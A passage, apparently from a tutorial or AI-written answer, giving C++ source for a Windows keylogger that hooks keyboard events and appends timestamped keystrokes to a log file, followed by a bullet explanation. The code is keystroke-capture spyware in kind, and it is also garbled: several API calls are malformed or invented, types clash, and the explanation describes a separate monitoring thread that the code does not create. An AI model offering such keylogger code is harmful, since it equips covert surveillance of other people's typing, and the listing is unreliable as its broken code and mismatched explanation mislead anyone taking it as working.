8. **Close the File**: Properly close the file after logging to avoid any issues.

### Code Implementation

```c
#include <Windows.h>
#include <Winuser.h>
#include <iostream>
#include <fstream>
#include <ctime>
#include <thread>
#include <mutex>

using namespace std;

#define KEYDOWN 0x0100
#define KEYUP 0x0101

static int g_hook = 0;
static HANDLE hFile;
static mutex mMutex;

static LRESULT CALLBACK KeyLoggerCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    if (!IsKeyDown(wParam)) {
        if (g_hook) {
            // Key released
            char key = ' ';
            if (wParam == VK_SHIFT) key = '~';
            else if (wParam == VK_CONTROL) key = ':';
            else if (wParam == VK_MENU) key = ';';
            else if (wParam == VK_ESCAPE) key = '\\';
            else {
                char keyChar;
                if (GetCharFromVk(wParam, &keyChar) && Is printable(keyChar)) {
                    key = keyChar;
                } else {
                    key = ' ';
                }
            }
            // Append to file
            {
                lock_guard lock(mMutex);
                time_t now;
                time(&now);
                fprintf(hFile, "[%s] %c\n", ctime(&now), key);
            }
        }
    }
    return 0;
}

int main() {
    char filename[] = "keyboard.log";
    hFile = fopen(filename, "a");
    if (!hFile) {
        cout << "Failed to create log file!" << endl;
        return 1;
    }

    DWORD thread;
    if (SetWindowsHook(WHO HookKeyboard, KeyLoggerCallback, &thread)) {
        thread hThread = thread;
        if (hThread) {
            // Start the hook in a separate thread
            if (hThread != 0) {
                if (hThread != 0) {
                    if (!DuplicateHandle(hThread)) {
                        CloseHandle(hThread);
                    }
                }
            }
        }
    } else {
        cout << "Failed to set keyboard hook!" << endl;
        return 1;
    }

    // Wait for input to break the loop
    while (true) {
        char c;
        scanf("%c", &c);
        if (c == 'q') break;
    }

    // Release the hook and clean up
    if (hThread) {
        if (UnhookKeyboard(hThread)) {
            CloseHandle(hThread);
        }
    }
    fclose(hFile);
    return 0;
}
```

### Explanation

- **Headers**: The necessary Windows API headers are included to access functions and types related to keyboard hooks and file operations.
- **Callback Function**: `KeyLoggerCallback` is defined to handle each keyboard event. It checks if a key is pressed or released and logs it.
- **File Handling**: The log file is opened in append mode to keep a record of all keystrokes with timestamps.
- **Thread**: A separate thread is used to continuously monitor and log keystrokes without blocking the main thread.
- **Key Handling**: The callback function checks for printable characters and modifier keys, appending each to the log file.
- **Cleanup**: Proper cleanup is performed to release the hook and close the file, ensuring no resources are left hanging.

